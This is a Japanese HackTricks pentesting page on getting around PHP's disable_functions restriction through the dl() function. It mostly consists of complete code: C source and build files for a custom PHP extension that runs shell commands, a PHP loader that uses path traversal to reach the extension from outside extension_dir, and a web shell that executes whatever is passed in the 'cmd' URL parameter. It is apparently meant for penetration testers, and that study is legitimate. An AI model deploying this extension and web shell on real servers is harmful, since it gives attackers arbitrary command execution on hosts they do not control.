<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。

</details>

**重要な注意事項:**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`**は、PHPの拡張機能をロードするために使用される関数です。この関数が無効化されていない場合、**`disable_functions`をバイパスして任意のコマンドを実行**することができます。\
ただし、いくつかの厳しい制限があります：

* `dl`関数は、**環境に存在し、無効化されていなければなりません**
* PHP拡張機能は、サーバーが使用している**同じメジャーバージョン**（PHP APIバージョン）で**コンパイルされている必要があります**（この情報はphpinfoの出力で確認できます）
* PHP拡張機能は、**`extension_dir`**ディレクティブで**定義されたディレクトリ**に**配置されている必要があります**（phpinfoの出力で確認できます）。攻撃者がサーバーを悪用しようとする際に、このディレクトリに書き込みアクセス権限を持っている可能性は非常に低いため、この要件はおそらくこのテクニックの悪用を防ぐでしょう。

**これらの要件を満たしている場合は、`disable_functions`をバイパスする方法を学ぶために、次の投稿を**[**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **から続けて読んでください**

管理者がボックスを設定しているとき、システムコマンドを実行できることについての言及がなかったため、[dl関数](http://www.php.net/manual/en/function.dl.php)を無効にしていませんでした。\
[dl関数](http://www.php.net/manual/en/function.dl.php)は、スクリプトが実行されるときにPHP拡張機能をロードするために使用されます。\
\
（PHP拡張機能はC/C++で書かれ、PHPにさらなる機能を提供するために使用されます。）\
\
攻撃者は、関数が無効化されていないことに気付き、潜在的な可能性を見出し、PHP拡張機能を作成することを決定します。\
攻撃者は、小さなスクリプト`<?php echo 'PHP Version is '.PHP_VERSION; ?>`を使用してPHPのバージョンをチェックします（PHP\_VERSIONは、PHPのバージョン番号を含む定義済みの定数です）。\
\
攻撃者はバージョンを確認し、[PHPのウェブサイト](http://www.php.net/downloads.php)からtarボールをダウンロードします。このシナリオでは、バージョンが現行リリースよりも古いため、攻撃者は[アーカイブ](http://museum.php.net)に移動する必要があります。\
\
次に、攻撃者はソースを抽出し、[コンパイルおよびインストール](http://www.php.net/manual/en/install.php)を自分のボックスで行います。\
\
それでは、拡張機能を作成しましょう。\
攻撃者は、PHPサイトから[PHP拡張機能の作成](http://www.php.net/manual/en/zend.creating.php)について調べます。\
ドキュメントを読み、独自の拡張機能を作成した後、攻撃者は既に作成されている関数を持つPHPコードベースを見ることにします。\
\
複製される関数は、[exec関数](http://www.php.net/manual/en/function.exec.php)です。\
コードベースでは、それはext/standard/exec.cにあります。\
\
関連する部分は、独自の拡張機能に実装されます。\
\

**注意事項:**

コードをコンパイルする前に、2つのポイントに注意する必要があります：

1- `bypass.c`ファイル内の`ZEND_MODULE_API_NO`の値を、現在の`Zend Extension Build`に変更する必要があります。これは、以下のコマンドラインを使用して取得できます：
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- 最新のPHPバージョン（5、7、8）でbypass.cファイルのコンパイル中にエラーが発生した場合、PHP_FUNCTION（bypass_exec）を次のように変更できます：
```
PHP_FUNCTION(bypass_exec)
{
FILE *in;
char *command;
size_t command_len;
zend_string *ret;
php_stream *stream;

ZEND_PARSE_PARAMETERS_START(1, 1)
Z_PARAM_STRING(command, command_len)
ZEND_PARSE_PARAMETERS_END();

if (!command_len) {
zend_argument_value_error(1, "cannot be empty");
RETURN_THROWS();
}
if (strlen(command) != command_len) {
zend_argument_value_error(1, "must not contain any null bytes");
RETURN_THROWS();
}

#ifdef PHP_WIN32
if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
RETURN_FALSE;
}

stream = php_stream_fopen_from_pipe(in, "rb");
ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
php_stream_close(stream);

if (ret && ZSTR_LEN(ret) > 0) {
RETVAL_STR(ret);
}
}
```
別々の拡張子のファイルは以下のようになります：

{% code title="bypass.c" %}
```c
/*
+----------------------------------------------------------------------+
| Copyright (c) 1997-2003 The PHP Group                                |
+----------------------------------------------------------------------+
| This source file is subject to version 2.02 of the PHP license,      |
| that is bundled with this package in the file LICENSE, and is        |
| available at through the world-wide-web at                           |
| http://www.php.net/license/2_02.txt.                                 |
| If you did not receive a copy of the PHP license and are unable to   |
| obtain it through the world-wide-web, please send a note to          |
| license@php.net so we can mail you a copy immediately.               |
+----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
PHP_FE(bypass_exec, NULL)
{NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
STANDARD_MODULE_HEADER,
#endif
PHP_BYPASS_EXTNAME,
bypass_functions,
NULL,
NULL,
NULL,
NULL,
NULL,
#if ZEND_MODULE_API_NO >= 20010901
PHP_BYPASS_VERSION,
#endif
STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
FILE *in;
int readbytes, total_readbytes=0, allocated_space;
pval **cmd;
char *ret;

if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
WRONG_PARAM_COUNT;
}

convert_to_string_ex(cmd);
#ifdef PHP_WIN32
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
RETURN_FALSE;
}

allocated_space = EXEC_INPUT_BUF;
ret = (char *) emalloc(allocated_space);

while (1) {
readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
if (readbytes<=0) {
break;
}

total_readbytes += readbytes;
allocated_space = total_readbytes+EXEC_INPUT_BUF;
ret = (char *) erealloc(ret, allocated_space);
}

pclose(in);

RETVAL_STRINGL(ret, total_readbytes, 0);
Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
{% code title="php_bypass.h" %}
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
{% code title="config.m4" %}
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

ファイルが作成されたら、PHP拡張機能をビルドする時が来ました。
```
phpize
./configure
make
```
これが完了すると、コンパイルされた拡張機能は、bypass.soというファイル名でmodulesサブディレクトリに配置されます。\
ファイルは安全な場所にコピーされ、次のコマンドが実行されて新しく作成されたファイルをクリーンアップします。
```
make clean
phpize --clean
```
今、攻撃者は新しく作成した拡張子を被害者のホストにアップロードします。

（注意：PHPのメジャーリリースでは、異なるAPIバージョンが使用されるため、拡張子を1つのホストでコンパイルして別のホストにアップロードするためには、APIバージョンが一致している必要があります。これが、最初に攻撃者のボックスに同じPHPバージョンをインストールした理由です。）

dl関数で拡張子をロードするためには、拡張子ディレクトリが必要であり、これはextension_dirディレクティブで定義されます。
攻撃者がこのディレクトリに書き込み権限を持っている可能性は低いため、これは問題となる場合がありますが、回避策があります。
この問題は、開発者によってdl関数のページのノートセクションで議論されています。

議論されたコンセプトは、定義された拡張子ディレクトリからの相対パスを使用することです。
たとえば、拡張子ディレクトリが/usr/php/extensionsに設定されており、現在のウェブディレクトリが/home/example.com/htmlでbypass.soをロードしたい場合、次のようにします：
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
これにより、定義された拡張ディレクトリに拡張子が必要なくなります。

また、異なるホストに対して相対パスを変更する必要がない自動化された方法もあります。このコードはendofyourself \[at] yahoo \[dot] comによって作成され、後にmag\_2000 \[at] front \[dot] ruによって改良されました。

この関数には1つの小さな問題がありました。一部のホストでは、拡張ディレクトリが"./"に設定されていますが、この関数は相対パスが設定されている場合を考慮していませんでした。これを修正するために、realpath関数を使用します。

無効化された関数をバイパスするために、拡張をロードし、システムコマンドを実行するための最終スクリプトは次のとおりです：
```php
<?php

function dl_local( $extensionFile ) {
if(!(bool)ini_get('enable_dl')
||(bool)ini_get('safe_mode')){
die('Loading extensions is not permitted.');
}

if(!file_exists($extensionFile)){
die('File '.$extensionFile.' does not exist.');
}

if(!is_executable($extensionFile)){
die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
}

$currentDir = getcwd().'/';
$currentExtPath = realpath(ini_get('extension_dir'));

$subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
unset($matches);

if(!(bool)$subDirs){
die('Could not determine a valid extension path [extension_dir]');
}

$extPathLastChar=strlen($currentExtPath )-1;

if($extPathLastChar==strrpos($currentExtPath,'/')){
$subDirs--;}$backDirStr = '';

for($i = 1; $i <= $subDirs; $i++){
$backDirStr .='..';
if($i != $subDirs){
$backDirStr .='/';
}
}

$finalExtPath = $backDirStr.$currentDir.$extensionFile;
if(!dl($finalExtPath)){
die();
}


$loadedExtensions = get_loaded_extensions();
$thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
$output = bypass_exec($_GET['cmd']);
echo '<pre>'.$output.'</pre>';
}
?>
```
攻撃者がコマンドを実行するために行うべきことは、スクリプトのURLに望むコマンドを含むcmd変数を付けて呼び出すだけです。
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
